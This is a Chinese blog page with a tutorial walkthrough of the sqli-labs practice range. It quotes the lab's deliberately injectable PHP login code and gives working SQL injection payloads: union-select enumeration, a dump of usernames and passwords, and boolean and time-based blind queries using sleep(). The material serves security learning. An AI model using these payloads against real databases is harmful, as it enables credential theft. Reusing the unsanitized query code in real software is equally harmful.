<!DOCTYPE html>
<html lang="zh-CN">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
  
  <title itemprop="name">sqli-lab | s1rius&#39;s blog</title>
  
    <link rel="shortcut icon" href="/images/favicon.ico">
  
  <meta http-equiv="x-dns-prefetch-control" content="on">
  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Noto+SerifMerriweather|Merriweather+Sans|Source+Code+Pro|Ubuntu:400,700|Noto+Serif+SC" media="all">
  <link rel="dns-prefetch" href="//cdn.jsdelivr.net">
  <link rel="stylesheet" id="saukra_css-css" href="/css/style.css" type="text/css" media="all">
  <link rel="stylesheet" href="/css/lib.min.css" media="all">
  <link rel="stylesheet" href="/css/font.css" media="all">
  <link rel="stylesheet" href="/css/insight.css" media="all">
  <link rel="stylesheet" href="/css/jquery.fancybox.min.css" media="all">
  <link rel="stylesheet" href="/css/zoom.css" media="all">
  <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<!--   <link rel="stylesheet" id="saukra_css-css" href="https://2heng.xin/wp-content/cache/autoptimize/css/autoptimize_ad42a61f4c7d4bdd9f91afcff6b5dda5.css
" type="text/css" media="all"> -->
  <script>
  /*Initial Variables*/
  var mashiro_option = new Object();
  var mashiro_global = new Object();
  mashiro_option.NProgressON = true;
  /* 
   * 邮箱信息之类的东西可以填在这里，这些js变量基本都作用于sakura-app.js
   * 这样的设置仅是为了方便在基于PHP开发的主题中设置js变量，既然移植到了Node上，我想或许可以精简这一逻辑吧
   */
  mashiro_option.email_domain = "";
  mashiro_option.email_name = "";
  mashiro_option.cookie_version_control = "";
  mashiro_option.qzone_autocomplete = false;
  mashiro_option.site_name = "s1rius's blog";
  mashiro_option.author_name = "s1rius's blog";
  mashiro_option.site_url = "https://s1rius.github.io";
  mashiro_option.v_appId = "GyC3NzMvd0hT9Yyd2hYIC0MN-gzGzoHsz";
  mashiro_option.v_appKey = "mgOpfzbkHYqU92CV4IDlAUHQ";
  mashiro_option.mathjax = "0";
  mashiro_option.qq_api_url = "https://api.mashiro.top/qqinfo/"; 
  mashiro_option.qq_avatar_api_url = "https://api.mashiro.top/qqinfo/";

  // mashiro_option.jsdelivr_css_src = "https://cdn.jsdelivr.net/gh/moezx/cdn@3.4.5/css/lib.min.css";
  // mashiro_option.float_player_on = true;

  /*End of Initial Variables*/
  </script>
  <script type="text/javascript">
  var bg = "https://api.maho.cc/random-img/pc.php".split(",");
  var bgindex = Math.floor(Math.random()*bg.length);
  if (!!window.ActiveXObject || "ActiveXObject" in window) { //is IE?
    alert('朋友，IE浏览器未适配哦~');
  }
  </script>
  <style type="text/css">
  .hljs-ln{border-collapse:collapse}.hljs-ln td{padding:0}.hljs-ln-n:before{content:attr(data-line-number)}
  </style>
  <style type="text/css">.site-top .lower nav{display:block !important;}.author-profile i,.post-like a,.post-share .show-share,.sub-text,.we-info a,span.sitename,.post-more i:hover,#pagination a:hover,.post-content a:hover,.float-content i:hover{color:#FE9600}.feature i,.download,.navigator i:hover,.links ul li:before,.ar-time i,span.ar-circle,.object,.comment .comment-reply-link,.siren-checkbox-radio:checked + .siren-checkbox-radioInput:after{background:#FE9600}::-webkit-scrollbar-thumb{background:#FE9600}.download,.navigator i:hover,.link-title,.links ul li:hover,#pagination a:hover,.comment-respond input[type='submit']:hover{border-color:#FE9600}.entry-content a:hover,.site-info a:hover,.comment h4 a,#comments-navi a.prev,#comments-navi a.next,.comment h4 a:hover,.site-top ul li a:hover,.entry-title a:hover,#archives-temp h3,span.page-numbers.current,.sorry li a:hover,.site-title a:hover,i.iconfont.js-toggle-search.iconsearch:hover,.comment-respond input[type='submit']:hover{color:#FE9600}.comments .comments-main{display:block !important;}.comments .comments-hidden{display:none !important;}background-position:center center;background-attachment:inherit;}
  </style>
</head>
</html>
<body class="page-template page-template-user page-template-page-analytics page-template-userpage-analytics-php page page-id-1297 chinese-font serif isWebKit">
  <div class="scrollbar" id="bar">
  </div>
  <a href="#" class="cd-top faa-float animated"></a>
  <section id="main-container">
    <div class="headertop ">
  <div id="banner_wave_1"></div>
  <div id="banner_wave_2"></div>
  <figure id="centerbg" class="centerbg">
    <div class="focusinfo no-select">
      <div class="header-tou">
        <a href="https://s1rius.github.io">
          <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/avatar.jpg">
        </a>
      </div>
      <div class="header-info">
        <p>剑未配妥出门已是江湖，千帆过尽归来仍是少年。</p>
        <div class="top-social_v2">
          <li id="bg-pre">
            <img class="flipx" src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
          </li>
          
            
              
                <li>
                  <a href="http://github.com/cns1rius" target="_blank" class="social-github" title="github">
                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/github.png">
                  </a>
                </li>
              
            
              
                <li class="wechat">
                  <a href="/#">
                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/wechat.png">
                  </a>
                  <div class="wechatInner">
                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/custom/wechat.jpg">
                  </div>
                </li>
              
            
              
                <li>
                  <a href="tencent://AddContact/?fromId=45&amp;fromSubId=1&amp;subcmd=all&amp;uin=MjkxNjExNzQ3Mw==" target="_blank" class="social-github" title="qq">
                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/qq.png">
                  </a>
                </li>
              
            
              
                <li>
                  <a href="https://space.bilibili.com/TkRNME1UTTFNREky" target="_blank" class="social-github" title="Bilibili">
                    <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/social/bilibili.png">
                  </a>
                </li>
              
            
          
          <li id="bg-next">
            <img src="https://cdn.jsdelivr.net/gh/cns1rius/cdn@1.0/img/other/next-b.svg">
          </li>
        </div>
      </div>
    </div>
  </figure>
  <div id="video-container" style="">
    <video style="object-fit: fill" id="bgvideo" class="video" video-name="" src="" width="auto" preload="auto">
    </video>
    <div id="video-btn" class="loadvideo videolive">
    </div>
    <div id="video-add">
    </div>
    <div class="video-stu">
    </div>
  </div>
  <div class="headertop-down faa-float animated" onclick="headertop_down()">
    <span>
      <i class="fa fa-chevron-down" aria-hidden="true">
      </i>
    </span>
  </div>
</div>
    <div id="page" class="site wrapper">
      <header class="site-header no-select gizle sabit" role="banner">
  <div class="site-top">
    <div class="site-branding">
      <span class="site-title">
        <span class="logolink moe-mashiro">
          <a href="/">
            <span class="sakurasono"></span>
            <span class="shironeko">s1rius&#39;s blog</span>
          </a>
        </span>
      </span>
    </div>
    <div class="searchbox search-form-submit">
      <i class="iconfont js-toggle-search iconsearch icon-search">
      </i>
    </div>
    <div id="show-nav" class="showNav mobile-fit">
      <div class="line line1">
      </div>
      <div class="line line2">
      </div>
      <div class="line line3">
      </div>
    </div>
    <div class="lower-cantiner">
      <div class="lower">
        <nav class="mobile-fit-control hide">
          <ul id="menu-new" class="menu">
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-fort-awesome faa-shake" aria-hidden="true"></i>
                    首页
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/archives">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-archive faa-shake" aria-hidden="true"></i>
                    归档
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/categories/ctf/">
                          <i class="fa fa-code" aria-hidden="true"></i>
                          ctf
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/资源/">
                          <i class="fa fa-cloud-download" aria-hidden="true"></i>
                          资源
                        </a>
                      </li>
                    
                      <li>
                        <a href="/categories/随笔/">
                          <i class="fa fa-commenting-o" aria-hidden="true"></i>
                          随笔
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
              <li>
                <a href="/comment/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-pencil-square-o faa-tada" aria-hidden="true"></i>
                    留言板
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/links/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-link faa-shake" aria-hidden="true"></i>
                    友人帐
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/donate/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-heart faa-pulse" aria-hidden="true"></i>
                    赞赏
                  </span>
                </a>
                
              </li>
            
              <li>
                <a href="/">
                  <span class="faa-parent animated-hover">
                    <i class="fa  fa-leaf faa-wrench" aria-hidden="true"></i>
                    关于
                  </span>
                </a>
                
                  <ul class="sub-menu">
                    
                      <li>
                        <a href="/about/">
                          <i class="fa fa-meetup" aria-hidden="true"></i>
                          我
                        </a>
                      </li>
                    
                  </ul>
                
              </li>
            
          </ul>
        </nav>
      </div>
    </div>
  </div>
</header>

      <link rel="stylesheet" type="text/css" href="/css/sharejs.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
<div class="pattern-center-blank"></div>

<div id="content" class="site-content">
  <div id="primary" class="content-area">
    <main id="main" class="site-main" role="main">
      <article id="post-1" class="post-1 post type-post status-publish format-standard has-post-thumbnail hentry category-uncategorized">
        <div class="toc"></div>
        <!--<div class="toc-entry-content"><!-- 套嵌目录使用（主要为了支援评论）-->
        
          <header class="entry-header">
            <h1 class="entry-title">sqli-lab</h1>
            <p class="entry-census">s1rius&nbsp;·&nbsp;2022-8-29&nbsp;·&nbsp;<span id="busuanzi_value_page_pv"></span>次阅读</p></p>

            <hr>
          </header>
        
        <div class="entry-content">
          <p>sql注入就是<br>当用户输入一些本不是用户名密码的sql语句<br>这些语句没有被过滤<br>执行后通过回显等方式，使注入者获得了数据库的信息</p>
<blockquote>
<p>  水了几天用来搞visual studio2022和Windows11所以本文略微简陋写，以后会完善<br>  visual studio2022版美化教程见<a href="https://blog.csdn.net/qq_62414126/article/details/121863518" target="_blank" rel="noopener">Visual Studio 2022界面美化教程</a>.</p>
</blockquote>
<h1 id="GET传参"><a href="#GET传参" class="headerlink" title="GET传参"></a>GET传参</h1><p>先放代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//including the Mysql connect parameters.</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"../sql-connections/sql-connect.php"</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">// take the variables </span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'id'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">$id=$_GET[<span class="string">'id'</span>];</span><br><span class="line"><span class="comment">//logging the connection parameters to a file for analysis.</span></span><br><span class="line">$fp=fopen(<span class="string">'result.txt'</span>,<span class="string">'a'</span>);</span><br><span class="line">fwrite($fp,<span class="string">'ID:'</span>.$id.<span class="string">"\n"</span>);</span><br><span class="line">fclose($fp);</span><br><span class="line"><span class="comment">// connectivity </span></span><br><span class="line"><span class="comment">//注意get传参</span></span><br><span class="line">获取到输入的id后先打开一个result.txt然后把你上传的写入到那个文件里</span><br><span class="line">这样你再一次操作后你就可以看到你的注入语句真正注进去的是啥了</span><br><span class="line">$sql=<span class="string">"SELECT * FROM users WHERE id='$id' LIMIT 0,1"</span>;</span><br><span class="line"><span class="comment">//上面一行中$id前后的符号是关键，是注入语句闭合的符号</span></span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>($row)</span><br><span class="line">	&#123;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;font size='5' color= '#99FF00'&gt;"</span>;<span class="comment">//正确回显颜色为绿色</span></span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Login name:'</span>. $row[<span class="string">'username'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">'Your Password:'</span> .$row[<span class="string">'password'</span>];</span><br><span class="line">	  	<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;</span><br><span class="line">  	&#125;</span><br><span class="line">  	<span class="comment">//这是输入正确时的反馈，直接把运行结果告诉你</span></span><br><span class="line">    但是后几关就不一样了</span><br><span class="line">	<span class="keyword">else</span> </span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">'&lt;font color= "#FFFF00"&gt;'</span>;<span class="comment">//报错回显为黄色</span></span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		<span class="keyword">echo</span> <span class="string">"&lt;/font&gt;"</span>;  </span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//这是输入错误时的反馈，把mysql_error反馈给你</span></span><br><span class="line">    同样，后几关也不一样了</span><br><span class="line">&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123; <span class="keyword">echo</span> <span class="string">"Please input the ID as parameter with numeric value"</span>;&#125;</span><br><span class="line"><span class="comment">//这是反馈你输入为空的</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>==/<em> </em>我为了让读者能看得更清晰，我将注释符的右半部分删去，就像这句一样没有<em> </em>/（你细品这句话 悖论）==<br>我第一个注释是：注意get传参，前10关前半部分代码不变<br>第二个注释是提示读者要注意每一关的闭合方式（包裹方式）<br>在if后else前是正确回显部分 在else后是错误回显部分<br>这两部分是区分注入方式所需要关注的</p>
<h2 id="先讲理论"><a href="#先讲理论" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><p>根据两部分分别是否回显判断注入方式<br>注入方式包含联合查询、布尔盲注、时间盲注、报错注入等</p>
<h3 id="传参"><a href="#传参" class="headerlink" title="传参"></a>传参</h3><p>最基础的就是?id=1’、username=admin’这类传参语句，后面的’引号是闭合方式上面有讲，他用的啥符号闭合，你就要用相同的符号来闭合你的语句，输入这类最基础的注入语句来判断是否有报错回显 回显是黄色，代码段注释里有写</p>
<h3 id="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"><a href="#判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数" class="headerlink" title="判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数"></a>判断正确回显（绿色）的数据库中数据的列数，即本靶场回显的行数</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1’ order by 1<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>这里的省略号只要不报错 就加大数字，直到报错的前一个数字，就是回显的行数</p>
<h3 id="判断回显的数据是数据库中的哪几列"><a href="#判断回显的数据是数据库中的哪几列" class="headerlink" title="判断回显的数据是数据库中的哪几列"></a>判断回显的数据是数据库中的哪几列</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>这里的数字的最大值要等与上一步得到的那个数<br>上一步7报错，那行数就是6，这一步就要1，2，3，4，5，6–+<br>看看那几个数字出现在你屏幕上了<br>要注意要id=一个不正确的值 如0，-1之类 这样联合查询之后的返回值会让union之后的查询语句的结果在数组的第一列，而后台php代码只会回显第一列的数据</p>
<h3 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(schema_name) <span class="keyword">from</span> information_schema.schemata <span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>这里把查数据库的sql语句，替换掉出现在你屏幕上的一个数字 这里是3 来回显在屏幕上<br>group_concat(你要查询的数据）from 所在的库 表 列<br>这里查库名即查==schema_name== 这个数据被保存在==information_schema.schemata==<br>这样 回显的就是 数据库们 的名字</p>
<h3 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=‘<span class="keyword">security</span>’–+</span><br></pre></td></tr></table></figure>
<p>table 表 information_schema.tables类比上面 table_schema=‘ 库名’<br>==这里你要猜一下==哪个数据库会放着你想要的数据，然后输在库名那个位置</p>
<h3 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=‘<span class="keyword">users</span>’<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>同样类比上面 column 列<br>==这里还要猜== 上面回显的哪个表里有你要的数据</p>
<h3 id="提取数据"><a href="#提取数据" class="headerlink" title="提取数据"></a>提取数据</h3><p>==激动人心的时候到了==</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-1’ union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="keyword">group_concat</span>(<span class="keyword">concat_ws</span>(’~’,username,<span class="keyword">password</span>)) <span class="keyword">from</span> <span class="keyword">users</span>–+</span><br></pre></td></tr></table></figure>
<p>同样类比上面 有一处特殊concat_ws(符号，列名，列名）<br>中间那个符号会被concat_ws插入到两组数据之间，就是为了方便看<br>这样就查到数据了，是不是很简单。</p>
<h3 id="limit"><a href="#limit" class="headerlink" title="limit"></a>limit</h3><p>limit是限制那一部分显示，limitx，y是从x+1开始显示y个</p>
<h2 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h2><h3 id="正错回显都有"><a href="#正错回显都有" class="headerlink" title="正错回显都有"></a>正错回显都有</h3><p>就按上面的步骤一步一步找到数据<br>security———&gt;users——&gt;username&amp;password这就是靶场数据库的层次<br>图啥的以后再补</p>
<h2 id="理论进阶"><a href="#理论进阶" class="headerlink" title="==理论进阶=="></a>==理论进阶==</h2><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span>’ <span class="keyword">and</span> sleep (<span class="number">5</span>)–+</span><br><span class="line">?id=<span class="number">1</span>‘ <span class="keyword">and</span> <span class="keyword">if</span>((left((select schema_name from information_schema.schemata limit <span class="number">4</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)=‘s’),<span class="number">1</span>,sleep(<span class="number">3</span>))–+</span><br></pre></td></tr></table></figure>
<p>这样的句子sleep()就是延时执行的意思，</p>
<blockquote>
<p>==让浏览器先睡一会==<br>当你想判断对不对的时候，你就让对的睡一会，错的继续肝，这样你就能看出来了</p>
</blockquote>
<h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>下面几个方法各有优缺点<br>因为能知道sql-lab靶场数据库的数据<br>所以刷题时我多用left<br>实际</p>
<h4 id="substr"><a href="#substr" class="headerlink" title="substr"></a>substr</h4><p>substr(a,b,c)将a字段从第b个字符读取c个字符</p>
<h4 id="ascii"><a href="#ascii" class="headerlink" title="ascii"></a>ascii</h4><p>将括号中的字符转换为acsii码，再在最后进行值大小的判断，正确返回1，错误返回0</p>
<blockquote>
<p>类似于数学中的二分法</p>
<h4 id="left"><a href="#left" class="headerlink" title="left"></a>left</h4><p>left(a)从第一位开始读取a个字符</p>
</blockquote>
<h4 id="模糊查询-like"><a href="#模糊查询-like" class="headerlink" title="模糊查询 like"></a>模糊查询 like</h4><p>a like ‘%b%’ 判断a字符串里是否有b<br>a like ‘b%’ 判断a开头是否有 <del>b数</del></p>
<h4 id="regexp"><a href="#regexp" class="headerlink" title="regexp"></a>regexp</h4><p>regexp ‘a’正则表达式</p>
<blockquote>
<p>RegExp 对象表示正则表达式，它是对字符串执行模式匹配的强大工具 正则表达式通常被用来检索、替换那些符合某个模式(规则)的文本。<br>许多语言都有正则表达式<br>物理也有正则<br>所以正则是个啥(≧﹏ ≦)</p>
</blockquote>
<h2 id="实操进阶"><a href="#实操进阶" class="headerlink" title="实操进阶"></a>实操进阶</h2><h3 id="有报错回显-无正确回显"><a href="#有报错回显-无正确回显" class="headerlink" title="有报错回显 无正确回显"></a>有报错回显 无正确回显</h3><p>也就是说你在前四关能看见的绿字在5-8关用you are in替换了<br>也就是你之前查的库名 表名 列名 和数据不会回显了<br>当使用布尔盲注时 如果判断正确就会显示you are in<br>不正确的话就会报错<br>下图是第五关第一个用户名 最后一步注入语句<br>之前步骤参考第1到4关查各类信息的语句并用布尔盲注所用函数包装<img src="https://img-blog.csdnimg.cn/b430151e09e443ab9050d3d623a51bb0.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h3 id="正确回显和报错回显都没有"><a href="#正确回显和报错回显都没有" class="headerlink" title="正确回显和报错回显都没有"></a>正确回显和报错回显都没有</h3><p>不论你输入啥，他都会说you are in</p>
<blockquote>
<p>就像你说 ==啊对对对==</p>
</blockquote>
<p>这样 布尔盲注也没法用了<br>你不知道注入语句是对是错<br>这时就要用时间盲注了<br>把布尔盲注再进行包装<br>if(布尔盲注语句,sleep(3),1)<br>正确的话，浏览器会延时3秒再运行<br><img src="https://img-blog.csdnimg.cn/c5682cd2fa574b16bbae457ffa20e388.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAQ07lpKnni7w=,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center" alt="在这里插入图片描述"></p>
<h1 id="POST传参"><a href="#POST传参" class="headerlink" title="POST传参"></a>POST传参</h1><h2 id="先讲理论-1"><a href="#先讲理论-1" class="headerlink" title="==先讲理论=="></a>==先讲理论==</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--Form to post the data for sql injections Error based SQL Injection--&gt;</span><br><span class="line">&lt;form action=&quot;&quot; name=&quot;form1&quot; method=&quot;post&quot;&gt;</span><br><span class="line">	&lt;div style=&quot;margin-top:15px; height:30px;&quot;&gt;Username : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">	    &lt;input type=&quot;text&quot;  name=&quot;uname&quot; value=&quot;&quot;/&gt;</span><br><span class="line">	&lt;/div&gt;  </span><br><span class="line">	&lt;div&gt; Password  : &amp;nbsp;&amp;nbsp;&amp;nbsp;</span><br><span class="line">		&lt;input type=&quot;text&quot; name=&quot;passwd&quot; value=&quot;&quot;/&gt;</span><br><span class="line">	&lt;/div&gt;&lt;/br&gt;</span><br><span class="line">	&lt;div style=&quot; margin-top:9px;margin-left:90px;&quot;&gt;</span><br><span class="line">		&lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;Submit&quot; /&gt;</span><br><span class="line">	&lt;/div&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">        ==上面是前端 通过post传参uname和passwd==</span><br><span class="line">&lt;?php</span><br><span class="line">// take the variables</span><br><span class="line">if(isset($_POST[&apos;uname&apos;]) &amp;&amp; isset($_POST[&apos;passwd&apos;]))</span><br><span class="line">&#123;</span><br><span class="line">	$uname=$_POST[&apos;uname&apos;];</span><br><span class="line">	$passwd=$_POST[&apos;passwd&apos;];</span><br><span class="line">/后端接收前端传的参数</span><br><span class="line">	//logging the connection parameters to a file for analysis.</span><br><span class="line">	$fp=fopen(&apos;result.txt&apos;,&apos;a&apos;);</span><br><span class="line">	fwrite($fp,&apos;User Name:&apos;.$uname);</span><br><span class="line">	fwrite($fp,&apos;Password:&apos;.$passwd.&quot;\n&quot;);</span><br><span class="line">	fclose($fp);</span><br><span class="line">// connectivity </span><br><span class="line">	@$sql=&quot;SELECT username, password FROM users WHERE username=&apos;$uname&apos; and password=&apos;$passwd&apos; LIMIT 0,1&quot;;</span><br><span class="line">	$result=mysql_query($sql);</span><br><span class="line">	$row = mysql_fetch_array($result);</span><br><span class="line"></span><br><span class="line">	if($row)</span><br><span class="line">	&#123;</span><br><span class="line">  		//echo &apos;&lt;font color= &quot;#0000ff&quot;&gt;&apos;;	</span><br><span class="line">  		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;font color= &quot;#FFFF00&quot; font size = 4&gt;&apos;;</span><br><span class="line">		//echo &quot; You Have successfully logged in\n\n &quot; ;</span><br><span class="line">		echo &apos;&lt;font size=&quot;3&quot; color=&quot;#0000ff&quot;&gt;&apos;;	</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &apos;Your Login name:&apos;. $row[&apos;username&apos;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &apos;Your Password:&apos; .$row[&apos;password&apos;];</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/flag.jpg&quot;  /&gt;&apos;;	</span><br><span class="line">		/又是这里分成两部分，上面是正确回显</span><br><span class="line">		下面是报错回显</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">  	&#125;</span><br><span class="line">	else  </span><br><span class="line">	&#123;</span><br><span class="line">		echo &apos;&lt;font color= &quot;#0000ff&quot; font size=&quot;3&quot;&gt;&apos;;</span><br><span class="line">		//echo &quot;Try again looser&quot;;</span><br><span class="line">		print_r(mysql_error());</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &quot;&lt;/br&gt;&quot;;</span><br><span class="line">		echo &apos;&lt;img src=&quot;../images/slap.jpg&quot; /&gt;&apos;;	</span><br><span class="line">		echo &quot;&lt;/font&gt;&quot;;  </span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<h3 id="post传参"><a href="#post传参" class="headerlink" title="==post传参=="></a>==post传参==</h3><p>post传参有很多方式最本质的就是在输入框传<br>然后是一些插件具有传参功能 hackbar 他们一般需要配合抓包的插件使用<br>较多的是一些抓包软件，burpsuit等<br>他们既有抓包功能，也有重发器，测试器功能强大</p>
